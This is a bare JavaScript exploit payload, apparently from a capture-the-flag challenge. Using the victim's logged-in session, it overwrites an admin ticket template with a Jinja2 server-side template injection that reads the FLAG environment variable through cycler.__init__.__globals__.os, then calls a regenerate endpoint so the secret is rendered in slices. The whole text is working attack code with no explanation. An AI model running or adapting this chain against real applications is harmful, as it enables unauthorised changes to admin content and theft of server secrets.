(async () => {
  const tpl = `<html><body style="font-family: monospace; font-size: 14px;">
  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][0:16] }}</div>
  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][16:32] }}</div>
  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][32:48] }}</div>
  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][48:64] }}</div>
  <div>{{ cycler.__init__.__globals__.os.environ['FLAG'][64:80] }}</div>
  </body></html>`;

  await fetch("/admin/templates/1/edit", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({
      name: "Default Ticket Template",
      html_content: tpl,
      is_default: "on",
    }),
  });

  await fetch("/admin/tickets/1/regenerate", {
    method: "POST",
    credentials: "include",
  });
})();
